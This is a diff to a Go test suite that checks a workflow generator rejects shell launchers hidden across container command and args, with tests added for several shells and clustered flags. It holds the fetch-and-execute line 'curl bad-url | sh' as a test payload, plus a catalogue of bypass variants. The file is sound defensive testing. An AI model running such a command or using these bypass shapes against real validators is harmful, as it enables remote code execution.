@@ -45,18 +45,6 @@ func TestGenerateWorkflowRequiresImageOrModel(t *testing.T) {
 	}
 }
 
-func TestGenerateWorkflowRejectsShellLauncherCommand(t *testing.T) {
-	_, _, err := GenerateWorkflow(WorkflowRequest{
-		Name:    "train",
-		Image:   "python:3.11-slim",
-		Command: []string{"/bin/sh", "-c"},
-		Args:    []string{"echo hi"},
-	})
-	if err == nil || !strings.Contains(err.Error(), "may not use shell launcher") {
-		t.Fatalf("err=%v", err)
-	}
-}
-
 func TestGenerateWorkflowUnknownModelDoesNotUseShell(t *testing.T) {
 	manifest, _, err := GenerateWorkflow(WorkflowRequest{
 		Name:  "train-custom",
@@ -100,50 +88,97 @@ func TestGenerateWorkflowInjectionShapedModelIsArgvSafe(t *testing.T) {
 	}
 }
 
-// TestGenerateWorkflowRejectsShellLauncherArgsBypass verifies split command/args
-// shell launcher bypass attempts (e.g. command=["/bin/sh"], args=["-c", "..."]) are blocked.
-func TestGenerateWorkflowRejectsShellLauncherArgsBypass(t *testing.T) {
-	_, _, err := GenerateWorkflow(WorkflowRequest{
-		Name:    "train",
-		Image:   "python:3.11-slim",
-		Command: []string{"/bin/sh"},
-		Args:    []string{"-c", "curl bad-url | sh"},
-	})
-	if err == nil || !strings.Contains(err.Error(), "may not use shell launcher") {
-		t.Fatalf("expected error for shell launcher bypass, got: %v", err)
+const shellPayload = "curl bad-url | sh"
+
+// TestGenerateWorkflowRejectsShellLauncher covers every way a shell launcher can
+// be spread across command and args, including interleaved flags that a
+// fixed-position check misses.
+func TestGenerateWorkflowRejectsShellLauncher(t *testing.T) {
+	cases := []struct {
+		name    string
+		command []string
+		args    []string
+	}{
+		{"command holds flag", []string{"/bin/sh", "-c"}, []string{shellPayload}},
+		{"args hold flag", []string{"/bin/sh"}, []string{"-c", shellPayload}},
+		{"bash split", []string{"bash"}, []string{"-c", shellPayload}},
+		{"interactive flag before split", []string{"/bin/sh", "-i"}, []string{"-c", shellPayload}},
+		{"interactive flag inside args", []string{"bash"}, []string{"-i", "-c", shellPayload}},
+		{"trace flag before split", []string{"/bin/sh", "-x"}, []string{"-c", shellPayload}},
+		{"entirely in command", []string{"/bin/sh", "-i", "-c", shellPayload}, nil},
+		{"entirely in args", nil, []string{"/bin/sh", "-c", shellPayload}},
+		{"absolute usr path", []string{"/usr/bin/bash"}, []string{"-c", shellPayload}},
+		{"dash", []string{"dash"}, []string{"-c", shellPayload}},
+		{"ash", []string{"ash"}, []string{"-c", shellPayload}},
+		{"ksh", []string{"ksh"}, []string{"-c", shellPayload}},
+		{"busybox", []string{"busybox"}, []string{"sh", "-c", shellPayload}},
+		{"zsh", []string{"zsh"}, []string{"-c", shellPayload}},
 	}
-
-	_, _, err = GenerateWorkflow(WorkflowRequest{
-		Name:    "train",
-		Image:   "python:3.11-slim",
-		Command: []string{"bash"},
-		Args:    []string{"-c", "curl bad-url | sh"},
-	})
-	if err == nil || !strings.Contains(err.Error(), "may not use shell launcher") {
-		t.Fatalf("expected error for shell launcher bypass, got: %v", err)
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			_, _, err := GenerateWorkflow(WorkflowRequest{
+				Name:    "train",
+				Image:   "python:3.11-slim",
+				Command: tc.command,
+				Args:    tc.args,
+			})
+			if err == nil || !strings.Contains(err.Error(), "may not use shell launcher") {
+				t.Fatalf("command=%v args=%v: err=%v", tc.command, tc.args, err)
+			}
+		})
 	}
+}
 
-	// Test extra execution flag variants (-lc, -ec, -elc, -xc) requested in review
-	extraFlags := []string{"-lc", "-ec", "-elc", "-xc"}
-	for _, flag := range extraFlags {
-		_, _, err = GenerateWorkflow(WorkflowRequest{
-			Name:    "train",
-			Image:   "python:3.11-slim",
-			Command: []string{"/bin/sh"},
-			Args:    []string{flag, "curl bad-url | sh"},
-		})
-		if err == nil || !strings.Contains(err.Error(), "may not use shell launcher") {
-			t.Fatalf("expected error for shell launcher bypass flag %q, got: %v", flag, err)
+// TestGenerateWorkflowRejectsClusteredShellFlags checks flag clusters that still
+// make the shell evaluate the next argument as a command string.
+func TestGenerateWorkflowRejectsClusteredShellFlags(t *testing.T) {
+	for _, flag := range []string{"-lc", "-ec", "-elc", "-xc"} {
+		shapes := []struct {
+			command []string
+			args    []string
+		}{
+			{[]string{"/bin/sh"}, []string{flag, shellPayload}},
+			{[]string{"zsh", flag}, []string{shellPayload}},
+			{[]string{"bash", "-i"}, []string{flag, shellPayload}},
 		}
+		for _, shape := range shapes {
+			_, _, err := GenerateWorkflow(WorkflowRequest{
+				Name:    "train",
+				Image:   "python:3.11-slim",
+				Command: shape.command,
+				Args:    shape.args,
+			})
+			if err == nil || !strings.Contains(err.Error(), "may not use shell launcher") {
+				t.Fatalf("command=%v args=%v: err=%v", shape.command, shape.args, err)
+			}
+		}
+	}
+}
 
-		_, _, err = GenerateWorkflow(WorkflowRequest{
-			Name:    "train",
-			Image:   "python:3.11-slim",
-			Command: []string{"zsh", flag},
-			Args:    []string{"curl bad-url | sh"},
+// TestGenerateWorkflowAllowsNonShellEntrypoints guards the widened scan against
+// rejecting legitimate entrypoints that merely carry a -c flag of their own.
+func TestGenerateWorkflowAllowsNonShellEntrypoints(t *testing.T) {
+	cases := []struct {
+		name    string
+		command []string
+		args    []string
+	}{
+		{"python with own -c flag", []string{"python"}, []string{"train.py", "-c", "config.yaml"}},
+		{"shell running a script", []string{"/bin/sh"}, []string{"/app/run.sh"}},
+		{"shell with long flag only", []string{"bash"}, []string{"--login", "/app/run.sh"}},
+		{"no command or args", nil, nil},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			_, _, err := GenerateWorkflow(WorkflowRequest{
+				Name:    "train",
+				Image:   "python:3.11-slim",
+				Command: tc.command,
+				Args:    tc.args,
+			})
+			if err != nil {
+				t.Fatalf("command=%v args=%v: unexpected error: %v", tc.command, tc.args, err)
+			}
 		})
-		if err == nil || !strings.Contains(err.Error(), "may not use shell launcher") {
-			t.Fatalf("expected error for shell launcher bypass flag %q in command, got: %v", flag, err)
-		}
 	}
 }
